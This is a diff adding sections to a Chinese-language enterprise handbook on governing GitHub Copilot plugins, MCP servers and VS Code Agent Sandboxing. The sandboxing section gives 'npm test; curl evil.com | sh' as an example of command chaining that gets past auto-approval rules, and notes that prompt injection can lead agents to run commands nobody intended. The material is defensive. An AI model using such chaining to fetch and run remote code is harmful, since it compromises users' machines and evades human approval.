+> 上述為便於理解而重寫的**示意**結構，欄位名稱與必要性請以 `plugins/external.json` 當下的實際內容及 `.schemas/` 底下的 JSON Schema 為準。awesome-copilot 的驗證器 `eng/external-plugin-validation.mjs` 目前定義了 `marketplace`（檢查 Marketplace 登錄格式正確性）與 `publicSubmission`（檢查是否符合公開投稿門檻）兩組規則（Source-confirmed）。
+
+#### 收錄門檻（Source-confirmed）
+
+1. **必須是公開的 GitHub Repository**——私有 Repository 或非 GitHub 託管一律不受理。
+2. **必須走 Issue 審查流程**，而不是直接送 PR 修改 `plugins/external.json`。
+3. **核准後每六個月自動 re-review**——這是 awesome-copilot 對「外部內容可能事後變質」的制度性緩解措施。
+4. 一併適用第 2.5 節列出的 "What We Don't Accept" 拒收清單。
+
+#### 企業導入建議
+
+> ⚠️ 此小節為建議架構，並非 awesome-copilot 官方規定。
+
+| 建議 | 理由 |
+|---|---|
+| **一律以 commit SHA（而非分支名或 tag）鎖定版本** | tag 可被外部維護者刪除後重新指向不同 commit，只有 SHA 是不可變的 |
+| 建立企業自己的 External Plugin 允許清單（Allowlist） | 避免開發者從 Marketplace 自由安裝任意外部 Plugin |
+| 對高風險 External Plugin 改採 Vendoring 策略 | 將內容 fork 到企業自有 Repository 後再打包分發，把供應鏈收斂回企業可控範圍 |
+| 把「六個月 re-review」同步納入企業自己的週期性審查（第 28 章） | 不可假設 awesome-copilot 的 re-review 等同於企業自己的安全審查 |
 
 ### Scenario
 
@@ -1528,7 +2159,12 @@ enterprise-web-plugin/
 
 - [ ] 團隊已確認未使用已日落的 Copilot Extensions（GitHub App）機制
 - [ ] 已用 11.2 對照表跟同事說明 Plugins 與 Extensions 的差異
+- [ ] 已確認企業 Plugin 的內容組合寫在 `extensions.com.github.awesome-copilot` 而非頂層欄位（11.3）
+- [ ] 已確認 `author` 寫成**物件**、Agent 路徑為 `./agents/*.md`、Skill 路徑為資料夾且以 `/` 結尾（11.3）
+- [ ] 已實測確認 MCP 設定檔名應用 `mcp.json` 還是 `.mcp.json`，而非僅憑文件推論（11.3）
+- [ ] 已確認**未將 `*.instructions.md` 錯誤地打包進 Plugin**
 - [ ] Plugin 打包的資源清單已對應到第 8-9 章已驗證的 Skill／Agent 範例
+- [ ] 若使用 External Plugin，已以 `source.sha` 鎖定版本並納入企業允許清單（11.5）
 
 ---
 
@@ -1607,6 +2243,77 @@ copilot plugin marketplace remove <marketplace-name>
 
 以上指令均已對照 Copilot CLI 官方 plugin reference 文件核實（Source-confirmed）。
 
+### 12.6 宣告式安裝：`enabledPlugins`
+
+前述 `copilot plugin install` 屬於**命令式（imperative）**安裝——由每位開發者在自己的機器上逐一執行。GitHub 另提供**宣告式（declarative）**安裝機制：在設定檔中以 `enabledPlugins` 欄位列出要啟用的 Plugin，由 Copilot 在啟動時自動取得並啟用（官方已實作）。
+
+#### 設定檔位置與生效範圍
+
+| 設定檔 | 生效範圍 | 適用情境 |
+|---|---|---|
+| `~/.copilot/settings.json` | 個人層級，跨所有 Repository | 開發者個人偏好的輔助型 Plugin |
+| `.github/copilot/settings.json` | Repository 層級，所有協作者 | **企業標準做法**：把團隊必備 Plugin 寫進版控 |
+
+#### 設定範例
+
+```json
+{
+  "enabledPlugins": [
+    "enterprise-web-plugin@enterprise-plugins",
+    "security-review@awesome-copilot"
+  ]
+}
+```
+
+格式為 `<plugin-name>@<marketplace-name>`，與 `copilot plugin install` 的參數格式一致。
+
+#### 搭配 `extraKnownMarketplaces` 宣告自建 Marketplace
+
+`enabledPlugins` 中的 `@<marketplace-name>` 必須是**已知（known）的 Marketplace**。Copilot CLI 預設已內建 `copilot-plugins` 與 `awesome-copilot` 兩個 Known Marketplace，因此引用社群 Plugin 時**不需要**額外執行 `copilot plugin marketplace add`。但企業自建的私有 Marketplace 並不在預設清單中，必須先以 `extraKnownMarketplaces` 宣告，`enabledPlugins` 才能解析得到：
+
+```json
+{
+  "extraKnownMarketplaces": {
+    "enterprise-plugins": {
+      "type": "github",
+      "repository": "acme-corp/enterprise-plugins"
+    }
+  },
+  "enabledPlugins": [
+    "enterprise-web-plugin@enterprise-plugins",
+    "security-review@awesome-copilot"
+  ]
+}
+```
+
+| 欄位 | 作用 | 企業意義 |
+|---|---|---|
+| `extraKnownMarketplaces` | 宣告「**允許從哪裡取得** Plugin」 | 相當於 Plugin 的**來源白名單**，可搭配第 20.5 節的 `managed-settings.json` 由企業層級統一鎖定 |
+| `enabledPlugins` | 宣告「**實際啟用哪些** Plugin」 | 團隊必備能力清單，進版控、走 PR 審查 |
+
+> ⚠️ 兩者是**來源**與**內容**的分工關係：只寫 `enabledPlugins` 而未宣告來源，私有 Plugin 會解析失敗；只宣告 `extraKnownMarketplaces` 而未列入 `enabledPlugins`，則 Plugin 不會被啟用。企業自建 Marketplace 時兩者都必須設定。
+
+#### 為什麼企業應優先採用宣告式安裝
+
+| 面向 | 命令式（`copilot plugin install`） | 宣告式（`enabledPlugins`） |
+|---|---|---|
+| 一致性 | 各人手動安裝，版本與清單容易漂移 | 全 Repository 協作者取得同一份清單 |
+| 可稽核性 | 安裝行為散落在個別機器上，難以盤點 | **設定進版控**，變更留有 PR 紀錄與 Code Review |
+| 新人 Onboarding | 需照 SOP 逐條手動執行，容易漏步驟 | 開啟專案即自動生效，零手動步驟 |
+| Copilot cloud agent | **不支援** | **唯一支援方式** |
+
+> ⚠️ **關鍵限制（極易踩坑）**：**Copilot cloud agent 只支援宣告式的 `enabledPlugins`**，不會執行任何 `copilot plugin install` 指令。若團隊的 Plugin 僅以命令式安裝在本機，cloud agent 情境下會完全取不到這些能力，症狀是「在 VS Code 好好的，交給 cloud agent 就少了某個 Agent／Skill」。
+>
+> ⚠️ 另需注意第 6.6 節提過的 default branch 限制：cloud agent 讀取的是 **default branch 上的 `.github/copilot/settings.json`**，在 feature branch 上新增的 `enabledPlugins` 不會生效，必須先合併回 default branch。
+
+#### 企業落地建議
+
+> ⚠️ 此小節為建議架構，並非 GitHub 官方規定的部署模式。
+
+1. 在企業 Repository 範本（第 23 章標準目錄）中預先放入 `.github/copilot/settings.json`，把必備 Plugin 列為預設。
+2. 對 `.github/copilot/` 目錄設定 `CODEOWNERS`，讓 Plugin 清單的變更必須經平台團隊核准。
+3. 個人層級的 `~/.copilot/settings.json` 僅允許加入**唯讀、無 Shell 執行能力**的輔助型 Plugin，其餘一律走 Repository 層級。
+
 ### Scenario
 
 某企業誤以為 Plugin 安裝後會自動更新，結果團隊成員實際使用的 Plugin 版本各不相同，導致「同一個 Agent 在不同人電腦上行為不一致」的困惑。**修正**：在企業 Onboarding 文件中明確要求定期執行 `copilot plugin update --all`，並將版本檢查納入第 26 章 Tutorial 1「安裝與第一次使用」的標準步驟。
@@ -1634,6 +2341,8 @@ copilot plugin marketplace remove <marketplace-name>
 - [ ] 已成功註冊 awesome-copilot 為 Marketplace 來源並安裝過至少一個 Plugin
 - [ ] 已建立企業自建 Plugin 的更新/移除流程文件
 - [ ] 已在 Onboarding 文件中提醒「Plugin 不會自動更新」
+- [ ] 團隊必備 Plugin 已改以 `.github/copilot/settings.json` 的 `enabledPlugins` 宣告式管理（12.6）
+- [ ] 已確認 Copilot cloud agent 情境所需的 `enabledPlugins` 設定位於 **default branch**（12.6）
 
 ---
 
@@ -1879,6 +2588,21 @@ sequenceDiagram
 
 > ⚠️ 上表除 GitHub MCP 外，其餘均**非 awesome-copilot 官方收錄或 GitHub 官方提供**，是本手冊列出的「企業可能需要」的示意清單，安裝任何一個前都必須依第 21 章 Checklist 完整審查來源、權限範圍與網路存取行為。
 
+### 14.7 MCP Server 信任邊界與網域控管
+
+VS Code 官方文件把 MCP Server 列為**四大信任邊界之一**，需要使用者明確同意後才能運作（2026-08-28 複查，官方已實作）。企業導入 MCP 時必須同時管到這四層：
+
+| 信任邊界 | 行為 | 企業治理重點 |
+|---|---|---|
+| **工作區（Workspace）** | 未信任的工作區進入限制模式，**一併停用 Agent** | Clone 外部專案時，不要無意識地按下「信任作者」 |
+| **擴充套件發行者** | 需信任發行者才能使用其提供的工具 | 列入企業擴充套件白名單 |
+| **MCP Server** | **每台 Server 首次執行前都會跟你確認；設定變更後會再次詢問** | 「設定變更重新詢問」是針對供應鏈篡改的重要防線，不可教使用者「一律按同意」 |
+| **網路網域** | 與 VS Code 的 Trusted Domains 清單整合；`chat.agent.networkFilter` 可限制 Agent 工具與沙箱指令可存取的網域 | 搭配第 20.6 節使用，形成「工具層➕作業系統層」雙重網域控管 |
+
+上述信任均可透過 Command Palette **撤銷**。企業在發生事件（例如某套件被揭露為惡意）時，應將「撤銷信任」列入標準應變步驟，而不是只發一封信叫大家「不要用」。
+
+> ⚠️ **實務提醒（建議架構）**：第 14.4 節描述的是「設定檔放哪裡」，本節描述的是「設定了之後還需要誰點頭」。兩者必須同時寫進企業 SOP，否則會出現「設定都發下去了，但每位開發者還是自己按一次信任」的治理破口。
+
 ### Scenario
 
 某團隊為了讓 Copilot 能查詢生產資料庫，直接把生產環境的 DB 帳密寫進 `.vscode/mcp.json` 並提交到 Repository。**這是嚴重的安全事故**：MCP 設定檔若含有 Secret，一旦提交到版控就等於外洩。正確做法是透過環境變數或企業密鑰管理系統注入認證資訊，且資料庫帳號應僅具唯讀權限、限定於非生產環境。
@@ -1903,6 +2627,7 @@ PostgreSQL Database MCP（僅限測試環境資料庫）。
 ### 本章 Checklist
 
 - [ ] MCP 設定檔中**不含**任何硬編碼 Secret（一律用環境變數注入）
+- [ ] 已將「MCP Server 信任提示」與「撤銷信任」列入企業 SOP 與應變步驟（14.7）
 - [ ] 資料庫類 MCP 一律使用最小權限（唯讀、非生產環境）帳號
 - [ ] 已用 14.6 清單分清楚哪些 MCP 是官方提供、哪些需要企業自行審查
 - [ ] 已理解 MCP／Skill／Plugin 三者的本質差異（14.3）
@@ -2059,7 +2784,7 @@ Modernization Roadmap
 - **來源程式碼**：`PricingCalculator.java` 第 210-245 行，搭配 `MEMBER_LEVEL` 資料表
 - **規則描述**：程式碼顯示 VIP 會員折扣與促銷折扣「不可疊加」，但 `PricingCalculator`
   第 240 行有一段被註解掉的邏輯疑似曾支援疊加，且無對應的商業文件可佐證目前規則是否為刻意設計。
-- **信心等級**：⚠️ **需人工確認**——無法從程式碼判斷「不可疊加」是原始需求，還是历史 Bug 修復後未清理的殘留邏輯
+- **信心等級**：⚠️ **需人工確認**——無法從程式碼判斷「不可疊加」是原始需求，還是歷史 Bug 修復後未清理的殘留邏輯
 - **建議處理**：現代化前必須先向業務單位確認正確規則，不可直接沿用現有程式碼行為
 ```
 
@@ -2329,6 +3054,146 @@ graph LR
 
 > ⚠️ **企業啟示**：上述情資直接對應 20.2 的 Prompt Injection、Malicious Skill、MCP Supply Chain 三類風險並非理論假設，而是已發生的真實攻擊模式。20.1 的 Governance 模型與第 21 章的安全評估 Checklist **不是可有可無的官僚流程**，而是對應這些已知威脅的具體防禦措施；企業在說服管理層投入 Governance 資源時，可直接引用本節情資作為風險量化依據。
 
+### 20.5 企業級集中管控：`managed-settings.json`
+
+前面幾節的治理措施多半落在 Repository 層級，但第 6.6 節已指出治理上最大的破口是：**開發者可以自行安裝 GitHub Copilot app 或使用 Copilot CLI，繞過 IDE 與 Repository 層級的所有限制**。要堵住這個破口，必須使用企業管理者層級的 `managed-settings.json`（官方已實作）。
+
+#### 定位：客製化資源的最上層 Scope
+
+呼應第 6.3 節的 Scope 表，`managed-settings.json` 是位於最上層、**由企業 IT 部署、開發者無法自行覆寫**的設定層：
+
+```mermaid
+graph TB
+    E["Enterprise: managed-settings.json<br/>由企業 IT 部署，開發者不可覆寫"] --> O["Organization: GitHub.com 組織設定"]
+    O --> R["Repository: .github/copilot/settings.json"]
+    R --> P["Personal: ~/.copilot/settings.json"]
+    E -.->|"跨所有 harness 生效"| H["VS Code / Copilot CLI<br/>Copilot app / cloud agent"]
+```
+
+（實線＝由上而下的設定層級關係；虛線＝跨 harness 的生效範圍，這正是它與 Repository 層級設定的關鍵差異。）
+
+#### 兩項核心管控能力
+
+| 能力 | 說明 | 治理效果 |
+|---|---|---|
+| **Known Marketplaces** | 定義企業允許的 Marketplace 來源清單 | 開發者無法從未經核准的來源安裝 Plugin；可只保留企業自建 Marketplace，完全封閉外部來源 |
+| **Default-enabled Plugins** | 定義預設即啟用的 Plugin 清單 | 企業標準能力自動下發到每位開發者，不需依賴個人手動安裝 |
+
+#### 設定範例（示意）
+
+```json
+{
+  "knownMarketplaces": [
+    "acme-corp/enterprise-plugins",
+    "github/awesome-copilot"
+  ],
+  "enabledPlugins": [
+    "enterprise-web-plugin@enterprise-plugins"
+  ]
+}
+```
+
+> 上述為便於理解而重寫的**示意**內容。實際欄位名稱、檔案部署路徑與 MDM／群組原則的下發方式，請以 `docs.github.com` 上 Copilot 企業管理相關頁面的當下版本為準；企業部署前務必先在少量機器上驗證設定確實生效。
+
+#### 三層 Plugin 治理策略
+
+> ⚠️ 此小節為建議架構，並非 GitHub 官方規定的部署模式。
+
+| 導入階段 | Known Marketplaces 策略 | Default-enabled Plugins 策略 | 適用對象 |
+|---|---|---|---|
+| **Phase 1：觀察期** | 允許 `copilot-plugins` + `awesome-copilot` + 企業自建 | 僅下發 1–2 個低風險 Plugin | 第 22 章 Pilot 團隊 |
+| **Phase 2：收斂期** | 移除 `awesome-copilot`，改以 Vendoring 方式把已核准資源複製進企業自建 Marketplace | 下發企業標準 Plugin 全套 | 已完成第 21 章安全評估的團隊 |
+| **Phase 3：封閉期** | **僅保留企業自建 Marketplace** | 依部門差異化下發 | 處理法遵／高機敏資料的團隊 |
+
+#### 與其他治理手段的分工
+
+| 治理手段 | 管什麼 | 管不到什麼 |
+|---|---|---|
+| `managed-settings.json` | Plugin 的**來源**與**預設啟用清單**，跨所有 harness | Plugin 內部的 Agent／Skill 具體行為 |
+| `CODEOWNERS` + PR review | Repository 內客製化資源的**內容變更** | 開發者個人 Scope 的資源 |
+| Hooks（第 13 章） | Agent **執行期**的確定性攔截 | 資源安裝階段 |
+| 第 21 章安全評估 | 資源**納入前**的人工審查 | 核准後外部內容被變更（需搭配 11.5 的 SHA 鎖定） |
+
+> ⚠️ **企業實務結論**：`managed-settings.json` 是目前**唯一能同時管到 VS Code、Copilot CLI、Copilot app 與 cloud agent 四種 harness 的治理槓桿**。若企業已允許使用 Copilot app 卻沒有部署 `managed-settings.json`，等於第 20.1 的 Governance 模型只在 IDE 上生效，實際覆蓋率遠低於帳面。
+
+### 20.6 Agent Sandboxing：OS 層級的最後一道防線
+
+> ⚠️ 本節為第三版新增。前面所有治理手段（`managed-settings.json`、CODEOWNERS、`tools` 最小權限、Hooks）都屬於**應用層**控制；Agent Sandboxing 是唯一在 **OS 層級**強制執行的邊界，也是唯一能在「Agent 已被 prompt injection 攻陷」之後仍然有效的機制。
+
+#### 為什麼需要 OS 層級隔離
+
+VS Code 官方文件列出四個理由，每一個都對應企業實際遇過的問題：
+
+| 理由 | 說明 | 企業實況 |
+|---|---|---|
+| **核准疲勞（approval fatigue）** | 逐一核准每個終端機指令，使用者最終會無腦按同意 | 導入三個月後，「Always Allow」被按滿，等於沒有防護 |
+| **解析能力的極限** | Shell alias、引號串接、複雜語法可能繞過自動核准規則 | 允許 `npm test` 的規則，擋不住 `npm test; curl evil.com \| sh` 這類變形 |
+| **Prompt Injection** | 模型可能被外部內容誘導執行非預期指令 | 對應第 20.4 節透過 PR 留言注入的真實案例 |
+| **對外部服務的非預期動作** | Agent 可能誤觸雲端 API、CI、Issue Tracker | 「本來只是要跑測試，卻順手改了 Repository 設定」 |
+
+#### 涵蓋範圍與不涵蓋範圍
+
+| 項目 | 是否受 Sandbox 管轄 |
+|---|---|
+| Agent 工作階段中的終端機指令（`runInTerminal` 工具），**包含 Copilot Agent Host 工作階段** | ✅ 受管轄；沙箱內的指令會**自動核准、不再跳提示** |
+| 內建的檔案讀取／編輯／寫入工具 | ❌ **不受管轄**——這些走 VS Code 自己的權限系統 |
+| 完整的開發環境隔離 | ❌ 不涵蓋，需另外搭配 **dev container** |
+
+> ⚠️ 這是本節最重要的一個誤解點：**開了 sandbox 不等於「Agent 不能亂改檔案」**。檔案編輯工具走的是另一套權限模型。Sandbox 防的是「終端機指令做了你沒預期的事」。
+
+#### 檔案系統隔離規則
+
+| 面向 | 預設行為 |
+|---|---|
+| 讀取 | 允許讀 workspace 資料夾與沙箱暫存資料夾 |
+| 讀取 `$HOME` | **預設拒絕**——保護 `~/.ssh`、`~/.bashrc`、`~/.zshrc` 與各類憑證 |
+| 寫入 | 限制在**當前工作目錄與其子目錄** |
+| 逐指令自動放行 | 解析指令後自動授予必要路徑（例如 `git` → `~/.gitconfig`、`node` → Node 版本管理器目錄）；已涵蓋 git、node、npm、dotnet、Java、Rust |
+| 自訂規則 | 可設定允許／拒絕清單，**拒絕永遠優先（deny always wins）** |
+| 子行程 | 所有子行程一律繼承相同邊界 |
+
+#### 網路隔離與設定
+
+**所有對外連線預設封鎖。** 相關設定如下：
+
+| 設定 | 用途 |
+|---|---|
+| `chat.agent.sandbox.enabled` | 啟用沙箱（**僅 macOS／Linux**），預設 `off`，可設為 `on` |
+| `chat.agent.sandbox.allowNetwork` | 是否允許沙箱內指令對外連線 |
+| `chat.agent.networkFilter` | 限制 Agent 工具與沙箱指令可存取的網域 |
+| `chat.agent.allowedNetworkDomains` | 網域允許清單 |
+| `chat.agent.deniedNetworkDomains` | 網域拒絕清單 |
+
+> ⚠️ **官方明確警示**：放行網域時務必評估該網域本身的能力。例如允許 `api.github.com`，就等於允許 Agent 建立 PR 或修改 Repository 設定——網域允許清單本質上是**能力允許清單**，不是單純的連線白名單。
+
+#### 各作業系統的實作與前置需求
+
+| 平台 | 實作機制 | 前置需求 |
+|---|---|---|
+| **macOS** | Apple 沙箱框架（俗稱 Seatbelt） | 無需額外安裝 |
+| **Linux／WSL2** | `bubblewrap`（檔案系統）＋ `socat`（網路代理） | `sudo apt-get install bubblewrap socat` 或 `sudo dnf install bubblewrap socat` |
+| **WSL1** | — | **不支援**（缺少 user namespaces） |
+| **Windows（原生）** | — | 目前設定僅標示支援 macOS／Linux，Windows 團隊須改以 dev container 或 WSL2 達成等效隔離 |
+
+> ⚠️ **企業導入建議（建議架構）**：多數台灣企業開發環境以 Windows 為主，這代表 **Agent Sandboxing 在原生 Windows 上目前不可用**。務實的替代方案有三：（1）開發者改在 **WSL2** 中開啟 workspace；（2）統一使用 **dev container**；（3）在 Windows 上維持較嚴格的終端機指令核准政策，不啟用高自主模式（Autopilot）。企業標準文件應直接寫明「哪一種作業系統採用哪一種隔離方案」，而不是含糊帶過。
+
+#### 與其他控制層的關係
+
+```mermaid
+graph TB
+    L1["第 1 層：套用前審閱<br/>Diff 檢視 + Checkpoint"]
+    L2["第 2 層：行動前核准<br/>工作階段 / 工作區 / 使用者層級"]
+    L3["第 3 層：限制自主程度<br/>權限等級，上限為 Autopilot"]
+    L4["第 4 層：OS 層強制邊界<br/>Agent Sandboxing"]
+    L5["第 5 層：信任邊界<br/>工作區 / 發行者 / MCP Server / 網域"]
+
+    L1 --> L2 --> L3 --> L4 --> L5
+
+    L4 -.->|"唯一在模型被攻陷後仍有效"| NOTE["Prompt Injection 之後的殘存防護"]
+```
+
+圖說：實線為 VS Code 官方文件列出的五層信任與安全控制；虛線為本手冊補充的說明關係（建議架構）。
+
 ### Scenario
 
 某企業的 Security Team 一開始只審查「程式碼」，沒有把 Agent／Skill／Plugin 納入審查範圍，直到一次事件中發現某個社群 Skill 的 `allowed-tools` 授權了 Terminal 執行權限且腳本會對外連線，才驚覺客製化資源本身就是攻擊面之一。**修正**：把 20.1 的 Governance 模型正式納入企業 AI 治理政策，客製化資源比照第三方套件依賴（如 npm package）的審查標準處理。
@@ -2339,6 +3204,10 @@ graph LR
 - [ ] 客製化資源的安裝與修改已納入 Audit Log
 - [ ] 20.2 十類安全風險已納入企業 AI 治理政策文件
 - [ ] 已用 20.4 的 2026 年真實威脅情資向管理層說明 Governance 投資的必要性
+- [ ] 已部署 `managed-settings.json`，確認治理範圍涵蓋 Copilot app 與 Copilot CLI，而非只有 IDE（20.5）
+- [ ] 已依 20.5 三層策略決定目前所處的 Plugin 治理階段（觀察期／收斂期／封閉期）
+- [ ] 已依 20.6 決定各作業系統的隔離方案（macOS 原生沙箱／Linux 需裝 `bubblewrap`+`socat`／Windows 改用 WSL2 或 dev container）
+- [ ] 已知悉 Agent Sandboxing **不涵蓋**內建檔案編輯工具，未將其誤當成全面防護
 
 ---
 
@@ -2685,9 +3554,9 @@ Dependency Vulnerabilities、Secure Configuration
 
 ---
 
-## 26. 完整實戰 Tutorial（18 項）
+## 26. 完整實戰 Tutorial（20 項）
 
-> **本章定位說明**：下方 18 項為「Tutorial 導覽索引表」——目的、前置條件、關鍵步驟、預期結果、驗證方式、常見問題皆濃縮為一行，完整操作細節請對照「對應章節」欄位所指的章節（那些章節才有完整的 frontmatter 規格、範例檔案與 Scenario）。為了不讓本章淪為純索引、名實不符，26.1 額外挑選 3 項具代表性的 Tutorial（涵蓋「環境安裝」「宣告式資源建立」「事件驅動自動化」三種不同性質的任務），完整展開為含實際指令輸出與驗證步驟的逐步操作指南，供讀者直接照做；其餘 15 項則維持索引表形式，讀者依「對應章節」連結過去即可取得同等深度的範例。
+> **本章定位說明**：下方 20 項為「Tutorial 導覽索引表」——目的、前置條件、關鍵步驟、預期結果、驗證方式、常見問題皆濃縮為一行，完整操作細節請對照「對應章節」欄位所指的章節（那些章節才有完整的 frontmatter 規格、範例檔案與 Scenario）。為了不讓本章淪為純索引、名實不符，26.1 額外挑選 4 項具代表性的 Tutorial（涵蓋「環境安裝」「宣告式資源建立」「事件驅動自動化」「安全隔離」四種不同性質的任務），完整展開為含實際指令輸出與驗證步驟的逐步操作指南，供讀者直接照做；其餘 16 項則維持索引表形式，讀者依「對應章節」連結過去即可取得同等深度的範例。
 
 | # | Tutorial | 目的 | 前置條件 | 關鍵步驟 | 對應章節 | 預期結果 | 驗證方式 | 常見問題 |
 |---|---|---|---|---|---|---|---|---|
@@ -2709,6 +3578,8 @@ Dependency Vulnerabilities、Secure Configuration
 | 16 | Code Review | 對 PR 執行程式碼審查 | 已建立 `code-review-agent` | 切換 Agent，指定 PR/diff 範圍 | 第 9.4 節 | 產出具體可執行的審查意見 | 對照企業 Code Review 標準逐項確認 | 讓審查型 Agent 誤取得修改權限 |
 | 17 | CI/CD Integration | 將 Hook／Agentic Workflow 整合進 CI/CD | 已完成 Tutorial 10 | 依 4.2 節 `gh-aw` 流程編譯 Workflow | 第 4.2、13 章 | Pipeline 中自動執行 Agent 任務 | 檢查 Actions 執行紀錄 | 誤提交 `.lock.yml` 編譯產物 |
 | 18 | Enterprise Governance | 建立企業治理流程 | 已完成 Tutorial 1-17 | 依 20.3 節 Governance Workflow 執行 | 第 20-21 章 | 建立 Approved Catalog 與定期複核機制 | 抽查任一已核准資源，確認審查紀錄完整 | Governance 流程只在導入初期執行一次，後續未持續複核 |
+| 19 | 啟用 Agent Sandboxing | 在 OS 層級隔離 Agent 的終端機指令 | macOS 或 Linux／WSL2（WSL1 不支援） | 安裝 `bubblewrap`＋`socat`（Linux）→ 設 `chat.agent.sandbox.enabled: on` | 第 20.6 節 | 沙箱內指令自動核准、不再跟提示 | 執行一次對外連線指令，確認被封鎖 | 誤以為沙箱也管得到檔案編輯工具（實際不管） |
+| 20 | 客製化檔案品質評測 | 找出 Skill／Agent 規則的矛盾與模糊處 | 已有至少一份 `SKILL.md` 或 `.agent.md` | 安裝 Chat Customizations Evaluations → 開啟檔案看 Problems 面板 → `/analyze-prompt` | 第 8.11 節 | 取得可執行的改寫建議清單 | Problems 面板診斷清空 | 未先選定正確的 agent harness，導致清單不完整 |
 
 ### 26.1 精選 Tutorial 完整逐步示範
 
@@ -2819,15 +3690,68 @@ Dependency Vulnerabilities、Secure Configuration
 4. 驗證：開啟新的 Copilot Agent Session，若目前分支不符合命名規範，Session 開始時應能在 Log／輸出中看到步驟 1 腳本印出的警告訊息。
 5. 若沒有看到警告，依第 27 章 Troubleshooting「Hook 沒有執行」排查：最常見原因就是 Hook 設定檔還停留在未合併的 feature branch 上。
 
+#### Tutorial 19：啟用 Agent Sandboxing（完整版）
+
+以 Linux／WSL2 環境為例（macOS 可跳過步驟 1）：
+
+1. 安裝 OS 層隔離所需的兩個套件：
+
+   ```bash
+   # Debian / Ubuntu
+   sudo apt-get install bubblewrap socat
+
+   # Fedora / RHEL
+   sudo dnf install bubblewrap socat
+   ```
+
+2. 在 VS Code `settings.json` 中啟用沙箱（預設為 `off`）：
+
+   ```json
+   {
+     "chat.agent.sandbox.enabled": "on",
+     "chat.agent.sandbox.allowNetwork": false
+   }
+   ```
+
+3. 驗證**檔案系統隔離**：要求 Agent 執行一個讀取 `$HOME` 敏感檔的指令（例如列出 `~/.ssh`），預期應被拒絕：
+
+   ```bash
+   ls ~/.ssh
+   ```
+
+4. 驗證**網路隔離**：要求 Agent 執行一個對外連線指令，預期應被封鎖：
+
+   ```bash
+   curl -sS https://example.com
+   ```
+
+5. 若團隊確實需要特定網域（例如內部 npm registry），再逐一放行，**不要直接打開全部網路**：
+
+   ```json
+   {
+     "chat.agent.sandbox.allowNetwork": true,
+     "chat.agent.allowedNetworkDomains": ["registry.npmjs.org"],
+     "chat.agent.deniedNetworkDomains": ["api.github.com"]
+   }
+   ```
+
+6. 驗收重點：確認沙箱內的指令**不再跟出核准提示**（這正是沙箱的價值：用 OS 邊界取代人工核准疲勞），且上述步驟 3～4 的協定依然失敗。
+
+> ⚠️ 本 Tutorial 的指令與設定名稱取自 VS Code 官方文件（官方已實作，Preview 階段）；步驟的組合方式與驗證順序為本手冊建議架構。因為仍是 Preview，導入前請重新確認設定名稱是否變更。
+
 ### 本章 Checklist
 
 - [ ] 新人已依序完成 Tutorial 1-11（基礎操作），其中 Tutorial 1／6／10 已依 26.1 完整版逐步操作過
 - [ ] 團隊已完成 Tutorial 12-17（實戰案例）至少一輪
 - [ ] Tutorial 18（Governance）已成為持續性流程，而非一次性活動
+- [ ] Tutorial 19（Agent Sandboxing）已在至少一台開發機器實際驗證過隔離行為
+- [ ] Tutorial 20（客製化品質評測）已納入第 31 章 Quality Gate
 
 ---
 
 ## 27. Troubleshooting
+
+### 27.1 常見問題對照表
 
 | 問題 | 常見原因 | 解決方式 |
 |---|---|---|
@@ -2843,10 +3767,41 @@ Dependency Vulnerabilities、Secure Configuration
 | Context 不足 | `AGENTS.md`／Instructions 內容過於簡略 | 補充建置指令、目錄結構說明、重要限制（參考 7.6 節範例） |
 | Token 使用過高 | Skill／Instructions 內容冗長，或未善用漸進載入機制 | 精簡 `description`，善用第 8.4 節三段式漸進載入，避免一次性塞入大量內容 |
 | Agent 陷入循環 | Handoff 迴圈設計錯誤，或任務邊界不清楚 | 檢查 `handoffs` 設定是否形成迴路，人工中斷並重新設計協作拓樸（第 10 章） |
+| 客製化在某一 harness 有效、換一個就沒效 | 選錯 Session Target 的 agent harness（Local／Copilot／Claude／Codex） | 先確認目前 harness，再對照第 6.5 支援矩陣與第 6.7 節釐清 |
+| 個人層 Agent／Skill 完全讀不到 | 檔案放在 VS Code profile，而 Agent Host 讀的是 `~/.copilot`／`~/.claude` | 依第 9.6 節使用使用者客製化遷移，或直接上推至 Repository |
+| Monorepo 子專案讀不到共用規則 | `chat.useCustomizationsInParentRepositories` 未開啟，或父目錄未被信任 | 依第 6.4 節三項生效條件逐一檢查 |
+| 終端機指令在沙箱中失敗或連不上網路 | Agent Sandboxing 預設封鎖所有對外連線、且拒讀 `$HOME` | 依第 20.6 節調整 `chat.agent.allowedNetworkDomains`；確認 Linux 已安裝 `bubblewrap`、`socat` |
+| Skill 規則前後矛盾、Agent 行為不穩定 | 客製化檔案內部或檔案間存在語意衝突 | 用第 8.11 節 Chat Customizations Evaluations 分析，依 Problems 面板逐項修正 |
+
+### 27.2 Agent Debug Panel 與標準診斷流程
+
+上表是「已知症狀 → 已知原因」的對照；當問題不在表中時，請走以下官方診斷入口（2026-08-28 複查 VS Code 官方文件，官方已實作）：
+
+| 入口 | 操作路徑 | 看得到什麼 |
+|---|---|---|
+| Agent Debug Panel | Command Palette → `Developer: Open Agent Debug Panel` | 本次請求實際載入了哪些客製化資源 |
+| Agent Debug Logs | Chat 檢視右上「…」選單 → **Show Agent Debug Logs** | 載入順序、被忽略的檔案、工具呼叫紀錄 |
+
+**建議的五步診斷流程（建議架構）**：
+
+```mermaid
+graph TB
+    S1["1. 確認 Session Target<br/>harness / 執行環境 / role / 模型"]
+    S2["2. 開啟 Agent Debug Panel<br/>看實際載入哪些資源"]
+    S3["3. 對照第 6.5 支援矩陣<br/>確認該機制在此介面是否支援"]
+    S4["4. 檢查檔案位置與 frontmatter<br/>路徑 / applyTo / description"]
+    S5["5. 執行 schema 與語意驗證<br/>skill:validate 與 Evaluations"]
+
+    S1 --> S2 --> S3 --> S4 --> S5
+    S5 -->|"仍未解決"| ESC["升級：比對官方文件版本變更<br/>並建立最小重現專案"]
+```
+
+圖說：本流程為本手冊建議的診斷順序（建議架構），其中步驟 2 的工具為官方提供。實務上大多數「為什麼沒生效」的問題在步驟 1～3 就能釐清，不要一開始就改檔案內容。
 
 ### 本章 Checklist
 
 - [ ] 已將本表納入團隊內部 Wiki／FAQ，供新人自助排解問題
+- [ ] 已將 27.2 的五步診斷流程列為團隊標準，避免盲目改檔案
 - [ ] 「Agent 陷入循環」與「AI 修改不相關檔案」已有明確的人工中斷/回滾程序
 
 ---
@@ -3048,7 +4003,7 @@ graph LR
 
 ## 33. 與 Claude Code 概念映射
 
